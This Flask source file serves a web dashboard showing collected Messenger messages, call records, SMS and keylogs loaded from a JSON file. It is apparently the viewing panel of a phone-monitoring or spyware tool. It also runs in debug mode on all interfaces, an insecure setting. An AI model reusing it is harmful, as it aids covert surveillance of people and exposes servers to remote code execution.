import json
from flask import Flask, render_template

app = Flask(__name__, template_folder='frontend/templates', static_folder='frontend/static')

# Load data from JSON file
try:
    with open('data/aggregated_data.json') as f:
        data = json.load(f)
except FileNotFoundError:
    data = {
        "messenger_data": [],
        "call_data": [],
        "sms_data": [],
        "keylog_data": []
    }
    print("Warning: 'data/aggregated_data.json' not found. Using empty data.")

@app.route('/')
def index():
    """Render the launcher application homepage"""
    apps = [
        {"name": "Messenger", "icon": "chat"},
        {"name": "Call", "icon": "phone"},
        {"name": "SMS", "icon": "message"},
        {"name": "Keylogs", "icon": "keyboard"},
    ]
    return render_template('index.html', apps=apps)

@app.route('/app/<name>')
def app_details(name):
    """Render details for a specific app"""
    if name == "Messenger":
        messages = data.get('messenger_data', [])
        return render_template('app_details.html', app_name=name, data=messages)
    elif name == "Call":
        calls = data.get('call_data', [])
        return render_template('app_details.html', app_name=name, data=calls)
    elif name == "SMS":
        sms = data.get('sms_data', [])
        return render_template('app_details.html', app_name=name, data=sms)
    elif name == "Keylogs":
        keylogs = data.get('keylog_data', [])
        return render_template('app_details.html', app_name=name, data=keylogs)
    else:
        return render_template('app_details.html', app_name=name, data=[])

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0') 